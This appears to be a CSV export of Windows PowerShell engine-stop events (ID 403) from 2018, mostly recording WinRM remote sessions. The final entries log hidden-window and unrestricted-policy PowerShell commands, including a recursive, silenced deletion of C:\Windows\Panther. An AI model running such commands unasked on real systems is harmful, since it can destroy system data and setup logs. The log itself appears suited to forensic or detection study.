TimeCreated,Details,EventID
8/15/2018 17:39,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=27

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=9c59e752-9f0f-4bd3-8da2-87949e0b2e4a
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=ed992ce1-69f0-4d11-a68b-98e6fc8c80db
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 17:32,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=cfd1e4b0-44a8-4935-ae63-6aabcaa4e924
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=2d3ef4d5-f099-4800-adae-1d0648a2187f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 17:28,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d66bbf89-e910-492a-823d-16a1cd08436a
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=eac506bf-a705-4b8a-b41a-00cccacdaa0d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 9:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=23

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=0a82a400-e956-49ed-8f97-1ca6913c1724
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=b512ba8f-b1f9-48c4-a4b6-77a878428cdd
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 9:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=75

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=acf3c7c3-cd9b-42bc-8897-139f8d7fdd8e
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=aa499f52-b003-41d0-8c5d-d4f920b11ee6
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 9:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=75

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=09c966e0-8b43-4dcd-9f19-c04e027169ec
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=7d108bb1-0e61-4f2e-ae1d-8bf6d39a32e0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 9:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=579

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=a64be593-c05a-49c4-bcbf-bfbdf64ed035
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=d211a27c-6dc6-46e5-ac7d-61a7e454215e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 9:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=254a5010-185a-48d4-b913-6239c74d10eb
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=db833feb-553f-44a4-9923-e7b2dd4f0b00
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/15/2018 9:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=295

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=13f7ad71-b1ac-48a2-93d9-43430194a8db
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=e279666b-f78f-445b-ae11-b22357f63042
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/11/2018 21:55,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=39fa6e69-36b2-461a-a2dd-3f9b359bf8b1
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=304101f4-27ad-4c3f-8dc6-e2a5a71e5c15
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/8/2018 19:20,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=dbf7aaee-cf48-4ed7-b223-d17dfa326b52
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=d02ccd54-45d6-483f-8869-6d8fb2efb229
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/8/2018 18:46,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=32966a80-bf97-4c00-981b-78d4856b9c27
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=7d8f72c8-6dc1-47f6-b9a3-161fd1caf101
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/6/2018 17:54,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=843e2e14-4a88-41ee-9101-0fc60e2be808
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=4f15aa94-2c9b-4468-b86f-89f020f8c28e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/18/2018 3:12,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=9283f257-99d7-46d8-b475-f94c8f103b77
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=7e477399-8add-4a8e-83da-27afdde00a89
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/18/2018 3:12,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=b6422a53-5878-4ee8-8d32-cf3fba2e674f
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=7f0a0d31-7679-4148-8cc2-87bb013c4d60
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:46,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=f35753b5-c170-4045-9d0a-c053876e972c
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=26f3a19a-d123-43ea-9d0e-73ebe50a69e2
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:41,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=19f2c8f4-3362-4ea8-a172-513b3fcd293c
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=49f41828-72f9-4486-8b66-9ea5484d9a4d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=64412868-8c30-4963-bd7c-d1102a0744f3
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=2b2f04ec-afa9-4699-9cfe-6d15b7f49ef2
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:37,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=98bc7d4b-3662-4846-b7c3-9ae6d117d14a
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=d16a735c-c9ca-4a6e-8a2f-62bb4dd51749
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:28,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d45f4d78-e0f0-4411-b01d-c34691b37c21
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=5c206681-cfd5-4e5d-8ee5-12b6606714b8
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:27,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=fc86e997-1db4-4cda-bf6f-440f7b3fe4f7
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=191998e3-7a9a-4fc6-b38d-7a3796812af5
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:24,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=bbd37829-cad0-4f91-8f37-9d86bd46d874
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=923f9d0f-bc31-4917-a01c-74c08c3df174
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:20,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=fa29fc50-b1e8-4b54-8547-461d1f89d615
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=ac219204-9a5e-417f-ac2a-1d907a245add
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:20,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=240445de-50e4-424d-a4fa-7874c46f17ca
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=d433e8cb-f0d2-41cd-b1a2-5001b17fb506
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=06c78543-f43a-4ece-a4a6-cf52e979c594
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=f20f8c69-859f-46e0-96d2-0a74afcd5566
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=18

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=1e79e6f1-97e5-47ae-873c-71d65b40806b
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=7792d928-73b2-4d49-a6c8-b2e62a05865e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/7/2018 0:16,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=a8c745ab-fd0d-40b5-a0df-91cec43b21e0
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=4f1d930f-a899-4af2-a40a-a8bc65a102fb
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/6/2018 15:50,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=fd65ab35-7b8e-4085-bff1-cf47e1cffa11
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=babb9155-a24a-4898-b6ba-5722a5149e5e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/6/2018 4:06,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=0e7f4e27-352d-403b-bb17-d67f79398586
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=fba75f47-f371-4567-b043-f1bf7e24c39d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/6/2018 3:50,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=6001efac-38e8-4dd5-a85b-5d0720554f59
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=2ca9bda4-b3d8-4818-b9e4-52e02d52cf18
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
7/6/2018 3:45,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7aa92c52-83c8-467a-a837-824844291c11
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.98
	RunspaceId=3cc48e96-d660-46a4-9d09-0fc778d0d615
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
5/14/2018 7:19,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.16299.98
	HostId=a9638e50-7b5d-4ac9-8a21-53bd61fb16a6
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command & { $isOfficeInstalled = Get-AppxPackage Microsoft.Office.Desktop -allusers; if ($isOfficeInstalled -eq $null) { Out-File -FilePath 'C:\Users\ADMINI~1.SHI\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '0' -Encoding ascii; } else { Out-File -FilePath 'C:\Users\ADMINI~1.SHI\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '1' -Encoding ascii } }
	EngineVersion=5.1.16299.98
	RunspaceId=72b4bbd2-cca5-4928-90e5-0aeb5404a2be
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
5/5/2018 0:14,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.16299.98
	HostId=c6c3bf3a-3d7c-4ad2-8014-34c16830f5f0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell -NoProfile -ExecutionPolicy unrestricted -Command Set-ItemProperty -Path 'Registry::HKLM\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Type ExpandString -Value (Get-ItemProperty -Path 'Registry::HKLM\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).Path
	EngineVersion=5.1.16299.98
	RunspaceId=f92baf37-366c-4be8-a6f9-47b1369e5585
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
5/5/2018 0:14,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.16299.98
	HostId=901e9f77-bbda-46e8-b48d-ebec281834f3
	HostApplication=powershell -NoProfile -ExecutionPolicy unrestricted -Command rmdir -recurse C:\Windows\Panther >$null 2>&1
	EngineVersion=5.1.16299.98
	RunspaceId=4dd37534-27c1-44ed-ad1f-ceca58d77d52
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
